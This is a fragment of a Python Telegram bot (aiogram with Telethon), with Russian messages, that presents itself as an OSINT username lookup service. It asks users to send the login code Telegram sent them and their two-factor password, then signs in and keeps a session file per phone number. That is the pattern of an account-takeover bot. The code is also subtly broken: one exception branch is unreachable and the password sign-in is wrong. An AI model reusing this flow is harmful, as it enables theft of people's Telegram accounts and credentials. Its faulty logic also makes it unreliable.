    await message.answer('Введи код который пришел, чтоб подключить ваш Telegram')
    await state.set_state(Account.code)

@router.message(Account.code)
async def account_code_sent(message:Message,state:FSMContext):

    data = await state.get_data()
    phone_nep = data['phone_num']

    code = message.text.strip()
    client = TelegramClient(f'session_{phone_nep}',
                            api_id, api_hash)
    if len(code) != 5:
        await message.answer("❌ Код должен содержать 5 цифр. Попробуй еще раз:")
        return

    await state.update_data(code = message.text)
    data = await state.get_data()
    hashing = data['hashing']
    phone = data['phone_num']

    try:
        await client.connect()
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=hashing

        )


        if await client.is_user_authorized():

            me = await client.get_me()
            await message.answer(f'✅ Аккаунт @{me.username} успешно подключен!')

            await client.disconnect()

        else:
            await message.answer('❌ Не удалось авторизоваться')

        await state.clear()

    except SessionPasswordNeededError:
        await state.update_data(code=code)
        await message.answer('🔒 Введите пароль двухфакторной аутентификации:')
        await state.set_state(Account.password)

    except PhoneCodeInvalidError:
        await message.answer('❌ Неверный код. Попробуйте еще раз:')

    except Exception as e:

        await message.answer(f'❌ Ошибка при входе. Попробуйте снова{e}.')
        await state.clear()
    except PhoneCodeExpiredError:
        # 3. Если код "истек" - запрашиваем новый и пробуем сразу
        print("🔄 Запрашиваем новый код и пробуем сразу...")
        new_sent_code = await client.send_code_request(phone)

        # Пробуем войти с НОВЫМ кодом сразу
        try:
            await client.sign_in(
                phone=phone,
                code=code,  # Тот же код!
                phone_code_hash=new_sent_code.phone_code_hash

            )
            await client.disconnect()
            return "✅ Успешный вход! Проблема была в phone_code_hash"

        except PhoneCodeExpiredError:
            return "❌ Код действительно недействителен"










@router.message(Account.password)
async def password_sign_in(message:Message,state:FSMContext):
    user_id = message.from_user.id


    passworder = message.text.strip()
    data = await state.get_data()
    phone = data['phone_num']
    client = TelegramClient(f'session_{phone}',
                            api_id, api_hash)
    code = data['code']
    hashing = data['hashing']

    await client.sign_in(password=passworder,phone_code_hash=hashing)

    await state.clear()


@router.message(F.text.startswith('@'))
async def user_osint(message:Message):
    username = message.text.strip()
    not_start = username.replace('@','')
    if len(username) <=2:
        await message.answer('Введите коректный username',reply_markup=start_mes)
    else:
        url_for_user = f'https://t.me/{not_start}'

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='Telegram',url=url_for_user)]
        ])

        await message.answer(f'Пользователь найден:\nUsername : {username}',reply_markup=keyboard)








